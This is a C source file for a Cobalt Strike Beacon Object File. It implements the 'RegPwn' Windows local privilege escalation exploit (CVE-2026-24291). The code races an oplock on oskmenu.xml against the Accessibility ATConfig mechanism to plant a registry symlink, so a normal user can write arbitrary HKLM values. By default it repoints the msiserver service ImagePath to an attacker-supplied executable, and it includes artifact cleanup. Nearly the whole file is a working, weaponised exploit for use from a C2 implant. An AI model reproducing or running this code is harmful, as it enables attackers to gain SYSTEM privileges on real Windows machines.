/*
 * RegPwn BOF - CVE-2026-24291 Local Privilege Escalation
 *
 * BOF port of the original RegPwn exploit by Filip Dragovic (@Wh04m1001) / MDSec.
 * Exploits a registry symlink race condition via the Windows Accessibility
 * ATConfig mechanism to write arbitrary values to protected HKLM registry
 * keys from a normal user context.
 *
 * Original research & code:
 *   Blog:   https://www.mdsec.co.uk/2026/03/rip-regpwn/
 *   GitHub: https://github.com/mdsecactivebreach/RegPwn
 *   Author: Filip Dragovic (@Wh04m1001) - MDSec ActiveBreach
 *
 * Default target: HKLM\SYSTEM\CurrentControlSet\Services\msiserver\ImagePath
 */

#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"

/* ------------------------------------------------------------------ */
/* Constants                                                           */
/* ------------------------------------------------------------------ */
#define REGPWN_BUFSIZE 8192

#ifndef FSCTL_REQUEST_OPLOCK_LEVEL_1
#define FSCTL_REQUEST_OPLOCK_LEVEL_1  0x00090000
#endif

#ifndef FSCTL_OPLOCK_BREAK_ACK_NO_2
#define FSCTL_OPLOCK_BREAK_ACK_NO_2   0x00090050
#endif

#define REGPWN_HKLM                   ((HKEY)(ULONG_PTR)0x80000002)
#define REGPWN_HKCU                   ((HKEY)(ULONG_PTR)0x80000001)

#define REGPWN_REG_OPTION_CREATE_LINK 0x00000002
#define REGPWN_REG_OPTION_VOLATILE    0x00000001
#define REGPWN_REG_OPTION_OPEN_LINK   0x00000008
#define REGPWN_REG_LINK               0x00000006
#define REGPWN_REG_EXPAND_SZ          0x00000002

#define REGPWN_KEY_WRITE              0x00020006
#define REGPWN_KEY_CREATE_LINK        0x00000020
#define REGPWN_DELETE_ACCESS          0x00010000
#define REGPWN_KEY_READ               0x00020019

#define REGPWN_TOKEN_SESSION_ID       12

/* Current process token pseudo-handle */
#define REGPWN_CURRENT_PROCESS_TOKEN  ((HANDLE)(LONG_PTR)-4)

/* Value buffer size in bytes (512 wchars) */
#define REGPWN_VALBUF_CB              (1024 * sizeof(wchar_t))

/* ------------------------------------------------------------------ */
/* File-scope output buffer (base.c inline)                            */
/* ------------------------------------------------------------------ */
static char * output __attribute__((section(".data"))) = (char*)1;
static WORD currentoutsize __attribute__((section(".data"))) = 1;
static HANDLE trash __attribute__((section(".data"), unused)) = (HANDLE)1;

/* ------------------------------------------------------------------ */
/* base.c inline: bofstart / internal_printf / printoutput / bofstop   */
/* ------------------------------------------------------------------ */
#ifdef BOF
static int bofstart(void)
{
    output = (char*)MSVCRT$calloc(REGPWN_BUFSIZE, 1);
    currentoutsize = 0;
    return 1;
}

static void internal_printf(const char* format, ...)
{
    int buffersize = 0;
    char * curloc = NULL;
    char * intBuffer = NULL;
    char * transferBuffer = (char*)intAlloc(REGPWN_BUFSIZE);
    va_list args;

    va_start(args, format);
    buffersize = MSVCRT$vsnprintf(NULL, 0, format, args);
    va_end(args);

    intBuffer = (char*)intAlloc(buffersize + 1);

    va_start(args, format);
    MSVCRT$vsnprintf(intBuffer, buffersize + 1, format, args);
    va_end(args);

    if (buffersize + currentoutsize < REGPWN_BUFSIZE)
    {
        MSVCRT$memcpy(output + currentoutsize, intBuffer, buffersize);
        currentoutsize += buffersize;
    }
    else
    {
        curloc = intBuffer;
        while (buffersize > 0)
        {
            int transfersize = REGPWN_BUFSIZE - currentoutsize;
            if (buffersize < transfersize)
                transfersize = buffersize;
            MSVCRT$memcpy(output + currentoutsize, curloc, transfersize);
            currentoutsize += transfersize;
            if (currentoutsize == REGPWN_BUFSIZE)
            {
                BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
                currentoutsize = 0;
                MSVCRT$memset(output, 0, REGPWN_BUFSIZE);
            }
            MSVCRT$memset(transferBuffer, 0, transfersize);
            curloc += transfersize;
            buffersize -= transfersize;
        }
    }
    intFree(intBuffer);
    intFree(transferBuffer);
}

static void printoutput(BOOL done)
{
    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
    currentoutsize = 0;
    MSVCRT$memset(output, 0, REGPWN_BUFSIZE);
    if (done)
    {
        MSVCRT$free(output);
        output = NULL;
    }
}
#else
static void internal_printf(const char* format, ...)
{
    va_list args;
    va_start(args, format);
    vprintf(format, args);
    va_end(args);
}
#endif

/* lifecycle stub */
static void bofstop(void) { return; }

/* ------------------------------------------------------------------ */
/* check_reg_value: read current value of target HKLM key              */
/* Returns 0 on success, fills wValueBuf. Returns -1 if key missing.   */
/* ------------------------------------------------------------------ */
static int check_reg_value(
    const wchar_t *wszSubKey,
    const wchar_t *wszValueName,
    wchar_t *wValueBuf,
    DWORD cbBufSize)
{
    HKEY hKey = NULL;
    LONG lRes = 0;
    DWORD dwType = 0;
    DWORD cbData = cbBufSize;
    int ret = -1;

    lRes = ADVAPI32$RegOpenKeyExW(REGPWN_HKLM, wszSubKey, 0,
                                  REGPWN_KEY_READ, &hKey);
    if (lRes != 0)
    {
        MSVCRT$_snwprintf(wValueBuf, cbBufSize / sizeof(wchar_t),
                          L"(key not found, error %ld)", lRes);
        wValueBuf[(cbBufSize / sizeof(wchar_t)) - 1] = L'\0';
        goto cleanup;
    }

    lRes = ADVAPI32$RegQueryValueExW(hKey, wszValueName, NULL,
                                      &dwType, (LPBYTE)wValueBuf, &cbData);
    if (lRes != 0)
    {
        MSVCRT$_snwprintf(wValueBuf, cbBufSize / sizeof(wchar_t),
                          L"(value not found, error %ld)", lRes);
        wValueBuf[(cbBufSize / sizeof(wchar_t)) - 1] = L'\0';
        goto cleanup;
    }
    wValueBuf[(cbBufSize / sizeof(wchar_t)) - 1] = L'\0';
    ret = 0;

cleanup:
    if (hKey)
    {
        ADVAPI32$RegCloseKey(hKey);
        hKey = NULL;
    }
    return ret;
}

/* ------------------------------------------------------------------ */
/* get_session_atconfig_path: build HKLM ATConfig path with session ID */
/* ------------------------------------------------------------------ */
static int get_session_atconfig_path(wchar_t *wszPathBuf, DWORD cchBuf)
{
    DWORD dwSessionId = 0;
    DWORD dwRetLen = 0;
    int ret = -1;

    if (!ADVAPI32$GetTokenInformation(
            REGPWN_CURRENT_PROCESS_TOKEN,
            (TOKEN_INFORMATION_CLASS)REGPWN_TOKEN_SESSION_ID,
            &dwSessionId, sizeof(dwSessionId), &dwRetLen))
    {
        internal_printf("[-] GetTokenInformation failed: %lu\n",
                        KERNEL32$GetLastError());
        goto cleanup;
    }

    MSVCRT$_snwprintf(wszPathBuf, cchBuf,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        L"\\Accessibility\\Session%lu\\ATConfig\\osk",
        (unsigned long)dwSessionId);
    wszPathBuf[cchBuf - 1] = L'\0';
    ret = 0;

cleanup:
    return ret;
}

/* ------------------------------------------------------------------ */
/* SHELLEXECUTEINFOW — defined inline for BOF (no shellapi.h)          */
/* ------------------------------------------------------------------ */
#ifdef BOF
typedef struct _REGPWN_SHELLEXECUTEINFOW {
    DWORD     cbSize;
    ULONG     fMask;
    HWND      hwnd;
    LPCWSTR   lpVerb;
    LPCWSTR   lpFile;
    LPCWSTR   lpParameters;
    LPCWSTR   lpDirectory;
    int       nShow;
    HINSTANCE hInstApp;
    void     *lpIDList;
    LPCWSTR   lpClass;
    HKEY      hkeyClass;
    DWORD     dwHotKey;
    HANDLE    hIcon;
    HANDLE    hProcess;
} REGPWN_SHELLEXECUTEINFOW;
#else
typedef SHELLEXECUTEINFOW REGPWN_SHELLEXECUTEINFOW;
#endif

#define REGPWN_SEE_MASK_NOCLOSEPROCESS 0x00000040

/* ------------------------------------------------------------------ */
/* start_osk: launch osk.exe via ShellExecuteExW (handles UAC), 5s    */
/* ------------------------------------------------------------------ */
static int start_osk(void)
{
    REGPWN_SHELLEXECUTEINFOW sei;
    int ret = -1;

    MSVCRT$memset(&sei, 0, sizeof(sei));
    sei.cbSize       = sizeof(sei);
    sei.fMask        = REGPWN_SEE_MASK_NOCLOSEPROCESS;
    sei.hwnd         = NULL;
    sei.lpFile       = L"C:\\windows\\system32\\osk.exe";
    sei.lpParameters = NULL;
    sei.lpDirectory  = NULL;
    sei.nShow        = 0; /* SW_HIDE */

    if (!SHELL32$ShellExecuteExW(&sei))
    {
        internal_printf("[-] ShellExecuteExW(osk.exe) failed: %lu\n",
                        KERNEL32$GetLastError());
        goto cleanup;
    }

    internal_printf("[+] osk.exe launched. Sleeping 5s...\n");
    KERNEL32$Sleep(5000);

    if (sei.hProcess != NULL)
    {
        KERNEL32$CloseHandle(sei.hProcess);
        sei.hProcess = NULL;
    }
    ret = 0;

cleanup:
    return ret;
}

/* ------------------------------------------------------------------ */
/* add_hkcu_reg_value: create HKCU ATConfig key, set attacker value    */
/* ------------------------------------------------------------------ */
static int add_hkcu_reg_value(
    const wchar_t *wszValueName,
    const wchar_t *wszValueData)
{
    HKEY hKey = NULL;
    DWORD dwDisp = 0;
    LONG lRes = 0;
    DWORD cbData = 0;
    int ret = -1;

    lRes = ADVAPI32$RegCreateKeyExW(
        REGPWN_HKCU,
        L"Software\\Microsoft\\Windows NT\\CurrentVersion"
        L"\\Accessibility\\ATConfig\\osk",
        0, NULL, 0, REGPWN_KEY_WRITE, NULL, &hKey, &dwDisp);
    if (lRes != 0)
    {
        internal_printf("[-] RegCreateKeyExW(HKCU ATConfig) failed: %ld\n",
                        (long)lRes);
        goto cleanup;
    }

    cbData = (DWORD)((MSVCRT$wcslen(wszValueData) + 1) * sizeof(wchar_t));
    lRes = ADVAPI32$RegSetValueExW(hKey, wszValueName, 0,
                                    REGPWN_REG_EXPAND_SZ,
                                    (const BYTE *)wszValueData, cbData);
    if (lRes != 0)
    {
        internal_printf("[-] RegSetValueExW(HKCU value) failed: %ld\n",
                        (long)lRes);
        goto cleanup;
    }

    internal_printf("[+] HKCU registry value added.\n");
    ret = 0;

cleanup:
    if (hKey)
    {
        ADVAPI32$RegCloseKey(hKey);
        hKey = NULL;
    }
    return ret;
}

/* ------------------------------------------------------------------ */
/* setup_oplock: open oskmenu.xml and request level-1 oplock           */
/* Returns 0 on success, fills hFile and hEvent for the caller.        */
/* ------------------------------------------------------------------ */
static int setup_oplock(HANDLE *phFile, HANDLE *phEvent, OVERLAPPED *pOvl)
{
    DWORD dwErr = 0;
    int ret = -1;
    wchar_t wszPath[] =
        L"C:\\Program Files\\Common Files\\microsoft shared"
        L"\\ink\\fsdefinitions\\oskmenu.xml";

    *phFile = INVALID_HANDLE_VALUE;
    *phEvent = NULL;

    *phFile = KERNEL32$CreateFileW(
        wszPath,
        GENERIC_READ,
        FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED,
        NULL);
    if (*phFile == INVALID_HANDLE_VALUE)
    {
        internal_printf("[-] CreateFileW(oskmenu.xml) failed: %lu\n",
                        KERNEL32$GetLastError());
        goto cleanup;
    }

    *phEvent = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    if (*phEvent == NULL)
    {
        internal_printf("[-] CreateEventW failed: %lu\n",
                        KERNEL32$GetLastError());
        goto cleanup;
    }

    MSVCRT$memset(pOvl, 0, sizeof(*pOvl));
    pOvl->hEvent = *phEvent;

    if (!KERNEL32$DeviceIoControl(*phFile, FSCTL_REQUEST_OPLOCK_LEVEL_1,
                                   NULL, 0, NULL, 0, NULL, pOvl))
    {
        dwErr = KERNEL32$GetLastError();
        if (dwErr != ERROR_IO_PENDING)
        {
            internal_printf("[-] DeviceIoControl(oplock) failed: %lu\n",
                            dwErr);
            goto cleanup;
        }
    }

    internal_printf("[+] Oplock set on oskmenu.xml.\n");
    ret = 0;

cleanup:
    return ret;
}

/* ------------------------------------------------------------------ */
/* create_symlink: delete ATConfig key and recreate as registry symlink*/
/* ------------------------------------------------------------------ */
static int create_symlink(
    const wchar_t *wszAtconfigPath,
    const wchar_t *wszTargetNtPath)
{
    HKEY hKey = NULL;
    DWORD dwDisp = 0;
    LONG lRes = 0;
    DWORD cbData = 0;
    int ret = -1;

    lRes = ADVAPI32$RegDeleteKeyW(REGPWN_HKLM, wszAtconfigPath);
    if (lRes != 0 && lRes != 2) /* 2 = ERROR_FILE_NOT_FOUND */
    {
        internal_printf("[-] RegDeleteKeyW(ATConfig) failed: %ld\n",
                        (long)lRes);
        goto cleanup;
    }
    if (lRes == 2)
        internal_printf("[*] ATConfig key absent, creating symlink directly.\n");

    lRes = ADVAPI32$RegCreateKeyExW(
        REGPWN_HKLM, wszAtconfigPath, 0, NULL,
        REGPWN_REG_OPTION_CREATE_LINK | REGPWN_REG_OPTION_VOLATILE,
        REGPWN_KEY_WRITE | REGPWN_KEY_CREATE_LINK,
        NULL, &hKey, &dwDisp);
    if (lRes != 0)
    {
        internal_printf("[-] RegCreateKeyExW(symlink) failed: %ld\n",
                        (long)lRes);
        goto cleanup;
    }

    /* REG_LINK data must NOT include null terminator */
    cbData = (DWORD)(MSVCRT$wcslen(wszTargetNtPath) * sizeof(wchar_t));
    lRes = ADVAPI32$RegSetValueExW(hKey, L"SymbolicLinkValue", 0,
                                    REGPWN_REG_LINK,
                                    (const BYTE *)wszTargetNtPath, cbData);
    if (lRes != 0)
    {
        internal_printf("[-] RegSetValueExW(SymbolicLinkValue) failed: %ld\n",
                        (long)lRes);
        goto cleanup;
    }

    internal_printf("[+] Registry symlink created.\n");
    ret = 0;

cleanup:
    if (hKey)
    {
        ADVAPI32$RegCloseKey(hKey);
        hKey = NULL;
    }
    return ret;
}

/* ------------------------------------------------------------------ */
/* cleanup_symlink: open the symlink key with OPEN_LINK and delete it  */
/* ------------------------------------------------------------------ */
static int cleanup_symlink(const wchar_t *wszAtconfigPath)
{
    HKEY hKey = NULL;
    LONG lRes = 0;
    NTSTATUS ntStatus = 0;
    int ret = -1;

    lRes = ADVAPI32$RegOpenKeyExW(
        REGPWN_HKLM, wszAtconfigPath,
        REGPWN_REG_OPTION_OPEN_LINK,
        REGPWN_DELETE_ACCESS, &hKey);
    if (lRes != 0)
    {
        internal_printf("[!] RegOpenKeyExW(OPEN_LINK) failed: %ld "
                        "(symlink may already be gone)\n", (long)lRes);
        ret = 0;
        goto cleanup;
    }

    ntStatus = NTDLL$NtDeleteKey((HANDLE)hKey);
    if (ntStatus == 0)
    {
        internal_printf("[+] Symlink deleted.\n");
        ret = 0;
    }
    else
    {
        internal_printf("[-] NtDeleteKey failed: 0x%08lx\n",
                        (unsigned long)ntStatus);
    }

cleanup:
    if (hKey)
    {
        ADVAPI32$RegCloseKey(hKey);
        hKey = NULL;
    }
    return ret;
}

/* ------------------------------------------------------------------ */
/* build_nt_reg_path: convert "SYSTEM\CurrentControlSet\..." to        */
/*   "\Registry\Machine\SYSTEM\CurrentControlSet\..."                  */
/* ------------------------------------------------------------------ */
static int build_nt_reg_path(
    const wchar_t *wszHklmSubKey,
    wchar_t *wszNtPath,
    DWORD cchNtPath)
{
    MSVCRT$_snwprintf(wszNtPath, cchNtPath,
                      L"\\Registry\\Machine\\%ls", wszHklmSubKey);
    wszNtPath[cchNtPath - 1] = L'\0';
    return 0;
}

/* ------------------------------------------------------------------ */
/* oplock_wait_loop: lock workstation and poll for oplock break        */
/* ------------------------------------------------------------------ */
static int oplock_wait_loop(HANDLE hEvent)
{
    DWORD dwWait = 0;
    BOOL bLocked = FALSE;
    int iterations = 0;
    int ret = -1;

    while (iterations < 120)
    {
        if (!bLocked)
        {
            bLocked = TRUE;
            if (!USER32$LockWorkStation())
            {
                internal_printf("[-] LockWorkStation failed: %lu\n",
                                KERNEL32$GetLastError());
                goto cleanup;
            }
            internal_printf("[*] Workstation locked. Waiting for oplock...\n");
        }

        dwWait = KERNEL32$WaitForSingleObject(hEvent, 500);
        if (dwWait == WAIT_OBJECT_0)
        {
            internal_printf("[+] Oplock triggered!\n");
            ret = 0;
            goto cleanup;
        }
        iterations++;
    }

    internal_printf("[-] Oplock wait timed out after 60 seconds.\n");

cleanup:
    return ret;
}

/* ------------------------------------------------------------------ */
/* ack_oplock: explicit FSCTL_OPLOCK_BREAK_ACK_NO_2 acknowledgment     */
/* ------------------------------------------------------------------ */
static void ack_oplock(HANDLE hOplockFile)
{
    HANDLE hAckEvt = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    if (hAckEvt == NULL)
    {
        internal_printf("[!] CreateEventW(ack) failed, closing handle as fallback.\n");
        return;
    }

    OVERLAPPED ackOvl;
    MSVCRT$memset(&ackOvl, 0, sizeof(ackOvl));
    ackOvl.hEvent = hAckEvt;
    KERNEL32$DeviceIoControl(hOplockFile, FSCTL_OPLOCK_BREAK_ACK_NO_2,
                             NULL, 0, NULL, 0, NULL, &ackOvl);
    KERNEL32$WaitForSingleObject(hAckEvt, 5000);
    KERNEL32$CloseHandle(hAckEvt);
    hAckEvt = NULL;

    internal_printf("[+] Oplock acknowledged.\n");
}

/* ------------------------------------------------------------------ */
/* cleanup_hkcu: remove the attacker value and key from HKCU ATConfig  */
/* ------------------------------------------------------------------ */
static void cleanup_hkcu(const wchar_t *wszValueName)
{
    HKEY hKey = NULL;
    LONG lRes = 0;

    lRes = ADVAPI32$RegOpenKeyExW(
        REGPWN_HKCU,
        L"Software\\Microsoft\\Windows NT\\CurrentVersion"
        L"\\Accessibility\\ATConfig\\osk",
        0, REGPWN_KEY_WRITE, &hKey);
    if (lRes != 0)
        return;

    /* Delete the attacker's value */
    ADVAPI32$RegDeleteValueW(hKey, wszValueName);
    ADVAPI32$RegCloseKey(hKey);
    hKey = NULL;

    /* Delete the osk key itself (leaf key, will fail if subkeys exist) */
    ADVAPI32$RegDeleteKeyW(
        REGPWN_HKCU,
        L"Software\\Microsoft\\Windows NT\\CurrentVersion"
        L"\\Accessibility\\ATConfig\\osk");

    internal_printf("[+] HKCU ATConfig cleanup done.\n");
}

/* ------------------------------------------------------------------ */
/* post_exploit: ack oplock, sleep, close file, cleanup, verify        */
/* ------------------------------------------------------------------ */
static void post_exploit(
    HANDLE *phOplockFile,
    const wchar_t *wszAtconfigPath,
    const wchar_t *wszRegSubKey,
    const wchar_t *wszValueName,
    const wchar_t *wszOldValue,
    wchar_t *wszNewValue,
    DWORD cbNewValue)
{
    ack_oplock(*phOplockFile);

    internal_printf("[*] Sleeping 10s for propagation...\n");
    KERNEL32$Sleep(10000);

    /* Close file handle (release oskmenu.xml) */
    if (*phOplockFile != INVALID_HANDLE_VALUE)
    {
        KERNEL32$CloseHandle(*phOplockFile);
        *phOplockFile = INVALID_HANDLE_VALUE;
    }

    cleanup_symlink(wszAtconfigPath);

    MSVCRT$memset(wszNewValue, 0, cbNewValue);
    check_reg_value(wszRegSubKey, wszValueName, wszNewValue, cbNewValue);

    if (MSVCRT$wcscmp(wszOldValue, wszNewValue) == 0)
    {
        internal_printf("[-] Exploit FAILED. Value unchanged: %S\n",
                        wszNewValue);
    }
    else
    {
        internal_printf("[+] Exploit SUCCEEDED! New value: %S\n",
                        wszNewValue);
    }

    /* Always clean up HKCU artifacts regardless of success/failure */
    cleanup_hkcu(wszValueName);
}

/* ------------------------------------------------------------------ */
/* go() - BOF entry point                                              */
/* ------------------------------------------------------------------ */
#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser = {0};
    wchar_t *wszValueData = NULL;
    wchar_t *wszRegSubKey = NULL;
    wchar_t *wszValueName = NULL;
    int iValueDataLen = 0;
    int iRegSubKeyLen = 0;
    int iValueNameLen = 0;
    wchar_t wszAtconfigPath[256];
    wchar_t wszNtTarget[512];
    wchar_t *wszOldValue = NULL;
    wchar_t *wszNewValue = NULL;
    HANDLE hOplockFile = INVALID_HANDLE_VALUE;
    HANDLE hOplockEvent = NULL;
    OVERLAPPED ovl = {0};

    if (!bofstart())
        return;

    /* Heap-allocate large value buffers to stay under 4KB stack limit */
    wszOldValue = (wchar_t *)intAlloc(REGPWN_VALBUF_CB);
    wszNewValue = (wchar_t *)intAlloc(REGPWN_VALBUF_CB);
    if (!wszOldValue || !wszNewValue)
    {
        internal_printf("[-] Heap allocation failed.\n");
        goto cleanup;
    }

    /* Parse arguments: regValueData (Z), regSubKey (Z), regValueName (Z) */
    BeaconDataParse(&parser, Buffer, Length);
    wszValueData = (wchar_t *)BeaconDataExtract(&parser, &iValueDataLen);
    wszRegSubKey = (wchar_t *)BeaconDataExtract(&parser, &iRegSubKeyLen);
    wszValueName = (wchar_t *)BeaconDataExtract(&parser, &iValueNameLen);

    if (!wszValueData || iValueDataLen < 2 ||
        !wszRegSubKey || iRegSubKeyLen < 2 ||
        !wszValueName || iValueNameLen < 2)
    {
        internal_printf("[-] Invalid or missing arguments.\n");
        goto cleanup;
    }

    internal_printf("[*] RegPwn CVE-2026-24291 LPE\n");
    internal_printf("[*] Target key : HKLM\\%S\n", wszRegSubKey);
    internal_printf("[*] Value name : %S\n", wszValueName);
    internal_printf("[*] Value data : %S\n", wszValueData);

    /* Step 1: Read current value */
    if (check_reg_value(wszRegSubKey, wszValueName,
                        wszOldValue, REGPWN_VALBUF_CB) < 0)
    {
        internal_printf("[-] Target registry key does not exist.\n");
        goto cleanup;
    }
    internal_printf("[*] Old value  : %S\n", wszOldValue);

    /* Step 2: Get ATConfig path with session ID */
    MSVCRT$memset(wszAtconfigPath, 0, sizeof(wszAtconfigPath));
    if (get_session_atconfig_path(wszAtconfigPath, 256) < 0)
        goto cleanup;
    internal_printf("[+] ATConfig path: %S\n", wszAtconfigPath);

    /* Step 3: Start osk.exe */
    if (start_osk() < 0)
        goto cleanup;

    /* Step 4: Add attacker value to HKCU ATConfig */
    if (add_hkcu_reg_value(wszValueName, wszValueData) < 0)
        goto cleanup;

    /* Step 5: Set oplock on oskmenu.xml */
    if (setup_oplock(&hOplockFile, &hOplockEvent, &ovl) < 0)
        goto cleanup;

    /* Step 6: Lock workstation and wait for oplock break */
    if (oplock_wait_loop(hOplockEvent) < 0)
        goto cleanup;

    /* Step 7: Race — delete ATConfig, create symlink */
    MSVCRT$memset(wszNtTarget, 0, sizeof(wszNtTarget));
    build_nt_reg_path(wszRegSubKey, wszNtTarget, 512);

    if (create_symlink(wszAtconfigPath, wszNtTarget) < 0)
        goto cleanup;

    /* Steps 8-12: ack, sleep, close, cleanup, verify */
    post_exploit(&hOplockFile, wszAtconfigPath, wszRegSubKey,
                 wszValueName, wszOldValue, wszNewValue, REGPWN_VALBUF_CB);

cleanup:
    if (hOplockFile != INVALID_HANDLE_VALUE)
    {
        KERNEL32$CloseHandle(hOplockFile);
        hOplockFile = INVALID_HANDLE_VALUE;
    }
    if (hOplockEvent != NULL)
    {
        KERNEL32$CloseHandle(hOplockEvent);
        hOplockEvent = NULL;
    }
    if (wszOldValue) intFree(wszOldValue);
    if (wszNewValue) intFree(wszNewValue);
    printoutput(TRUE);
    bofstop();
}

#else
/* ------------------------------------------------------------------ */
/* Standalone test main()                                              */
/* ------------------------------------------------------------------ */
int main(int argc, char ** argv)
{
    wchar_t wszAtconfigPath[256];
    wchar_t wszNtTarget[512];
    wchar_t wszOldValue[1024];
    wchar_t wszNewValue[1024];
    HANDLE hOplockFile = INVALID_HANDLE_VALUE;
    HANDLE hOplockEvent = NULL;
    OVERLAPPED ovl;

    /* Defaults matching msiserver target */
    wchar_t *wszRegSubKey = L"SYSTEM\\CurrentControlSet\\Services\\msiserver";
    wchar_t *wszValueName = L"ImagePath";
    wchar_t *wszValueData = L"C:\\Programdata\\service.exe";

    if (argc >= 2)
    {
        int wlen = 0;
        printf("[*] Standalone test mode.\n");
        printf("[*] Usage: regpwn.exe [valueData] [subKey] [valueName]\n");
        wlen = MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, NULL, 0);
        wszValueData = (wchar_t *)malloc(wlen * sizeof(wchar_t));
        MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, wszValueData, wlen);
    }
    if (argc >= 3)
    {
        int wlen = MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, NULL, 0);
        wszRegSubKey = (wchar_t *)malloc(wlen * sizeof(wchar_t));
        MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, wszRegSubKey, wlen);
    }
    if (argc >= 4)
    {
        int wlen = MultiByteToWideChar(CP_UTF8, 0, argv[3], -1, NULL, 0);
        wszValueName = (wchar_t *)malloc(wlen * sizeof(wchar_t));
        MultiByteToWideChar(CP_UTF8, 0, argv[3], -1, wszValueName, wlen);
    }

    memset(&ovl, 0, sizeof(ovl));

    internal_printf("[*] RegPwn CVE-2026-24291 LPE (standalone test)\n");
    internal_printf("[*] Target key : HKLM\\%S\n", wszRegSubKey);
    internal_printf("[*] Value name : %S\n", wszValueName);
    internal_printf("[*] Value data : %S\n", wszValueData);

    memset(wszOldValue, 0, sizeof(wszOldValue));
    if (check_reg_value(wszRegSubKey, wszValueName,
                        wszOldValue, sizeof(wszOldValue)) < 0)
    {
        internal_printf("[-] Target registry key does not exist.\n");
        return 1;
    }
    internal_printf("[*] Old value  : %S\n", wszOldValue);

    memset(wszAtconfigPath, 0, sizeof(wszAtconfigPath));
    if (get_session_atconfig_path(wszAtconfigPath, 256) < 0)
        return 1;
    internal_printf("[+] ATConfig path: %S\n", wszAtconfigPath);

    if (start_osk() < 0)
        return 1;

    if (add_hkcu_reg_value(wszValueName, wszValueData) < 0)
        return 1;

    if (setup_oplock(&hOplockFile, &hOplockEvent, &ovl) < 0)
        return 1;

    if (oplock_wait_loop(hOplockEvent) < 0)
        return 1;

    memset(wszNtTarget, 0, sizeof(wszNtTarget));
    build_nt_reg_path(wszRegSubKey, wszNtTarget, 512);

    if (create_symlink(wszAtconfigPath, wszNtTarget) < 0)
        return 1;

    post_exploit(&hOplockFile, wszAtconfigPath, wszRegSubKey,
                 wszValueName, wszOldValue, wszNewValue, sizeof(wszNewValue));

    if (hOplockFile != INVALID_HANDLE_VALUE)
        CloseHandle(hOplockFile);
    if (hOplockEvent != NULL)
        CloseHandle(hOplockEvent);

    return 0;
}
#endif
